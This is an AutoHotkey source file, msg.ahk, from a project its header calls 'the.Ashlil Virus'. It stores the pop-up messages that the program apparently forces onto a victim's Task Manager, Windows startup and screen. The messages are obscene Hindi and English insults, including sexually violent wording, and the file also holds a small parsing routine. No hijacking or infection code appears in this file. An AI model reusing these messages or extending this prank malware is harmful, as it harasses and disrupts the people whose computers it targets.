/*
	the.Ashlil Virus 
     // msg.ahk \\  

  Author(s):-     pSych0 C0d3r		  &&       cyBer gHo$t     
  Contact:-  pSych0.c0d3r@gmail.com       gh0$t.(yber@gmail.com

  Description:- 
	All the messages at a central repository.
*/

msgList = 
( Join|
taskManager
winStartup
onScreen
)

;################################## Task Manager
taskManager = 
( Join`,
Chalwaun Task Manager, Saale Chup Challa Baitha Reh.
Fuck in Progress........, Please wait while your task manager is being raped.
)

;################################## Windows Startup
winStartup = 
( Join`,
Aur chutiye, Maine suna hai tera lund kat gaya.
)

;################################## Windows Startup
onScreen = 
( Join`,
Why Don't You Have Some SEX., Centre cff000000 r4 s100
Masturbation is good for health., Centre cff000000 r4 s75
)

;################################## Messages -> Variables
Loop, Parse, msgList, |
{
	i = 1
	varName = %A_LoopField%
	
	Loop, parse, %varName%, `,
	{
		If Mod(A_Index, 2) != 0 
			%varName%Title%i% = %A_LoopField%
		Else {
			%varName%Text%i% = %A_LoopField%
			i++
		}
	}
}
;################################## Misc.Functions()
chance(p)
{
	Random, Rnd, 1, 100
	Return Mod(Rnd, 100/p) = 0 ? true : false
}

bind(Byref num, low, high)
{
	num := (num < low) ? low : (num > high) ? high : num
}
